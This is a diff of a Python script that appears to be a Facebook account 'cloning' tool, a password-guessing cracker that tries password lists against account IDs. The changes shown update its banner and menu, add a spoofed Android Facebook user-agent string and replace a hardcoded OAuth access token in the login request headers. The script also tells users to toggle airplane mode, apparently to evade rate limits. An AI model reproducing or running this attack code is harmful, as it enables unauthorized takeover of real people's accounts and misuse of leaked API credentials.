@@ -71,14 +71,14 @@ def logo():
       \33[1;94m88~~~   88~~~88 88`8b   88~~~88   d8'   
       \33[1;95m88      88   88 88 `88. 88   88  d8' db 
       \33[1;96mYP      YP   YP 88   YD YP   YP d88888P\033[;37m  
-=======================================================
-\033[;37m\033[;92m         BILAL HAIDER ID       FARAZ ALI ID  
-\033[;37m=======================================================
- No Technology That \033[;96mConnected\033[;37m To Internet Is \033[;92mUnhackable \033[;37m
-=======================================================""")
+----------------------------------------------------------------
+  Owner    :    Faraz Ali Jatoi
+  Github   :    https://github.com/FARAZ-ID
+  Version  :    0.8    
+----------------------------------------------------------------""")
 
 def linex():
-	print("=======================================================")
+	print("----------------------------------------------------------------")
 def clear():
         os.system(f'clear')
         logo()
@@ -101,11 +101,11 @@ tokenku=[]
 def faraz():
 	clear()
 	#ckx()
-	print(f" [1] File Cloone ")
+	print(f" [1] File Clone ")
 	#print(f" [2] BD Random Cloner ")
 	print(f" [2] Gmail Cloning")
 	print(f" [0] Exit")
-	faraz = input("\033[;90m [>]\033[;37m Choose an option : ")
+	faraz = input("\033[;90m [-]\033[;37m Choose an option : ")
 	if faraz in ["2", "02"]:
 		gml()
 	if faraz in ["3","03"]:
@@ -138,7 +138,7 @@ def faraz():
 			clear()
 			total_ids = str(len(fo))
 			print(f' Total account : \033[1;32m'+total_ids+f'  ')
-			print("=======================================================")
+			print("----------------------------------------------------------------")
 			print(f"\033[1;37m Turn on & off flight (airplane) mode before use :)")
 			
 			linex()
@@ -181,6 +181,7 @@ def api(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
+                                ua_string = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
                                 ua_string = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"                                
                                 ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
@@ -206,7 +207,7 @@ def api(ids,names,passlist):
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth EAAGOfOcFdnYBADbE7id2Dgcs8fWKZAduxGfux7QGydKezhRjQFTfZCe0ZAZBoDN0Gtj9pu2ZAWiKZBEHCK5cM7C9k99JxlkVyJFdvCYgZAIlJnKg5tOdzKqW7lkKIdnxDQl3ZCIuJlkZAYrN8NMNZCEzjT2uN89qYjpspK2BgHgDigcnWJtUHDl83J',
+                                        'Authorization':'OAuth EAAGOfOcFdnYBAGruPUW9wLKmA2mI0jezgLPZCRBa9Lu6wZBuAY7gZATFlPKtemHuDaDu4N3sLKC7FtDSjqJ4PGGvNGQ7fn6IkFE035EO8ZAN2To4LIgWCcZAvXwhNazXsrb3RmPT5T39ZBzjmZBMXvQXWi6ypEOZC8cBZBpWRnrt3RbnRLvQjsFay',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
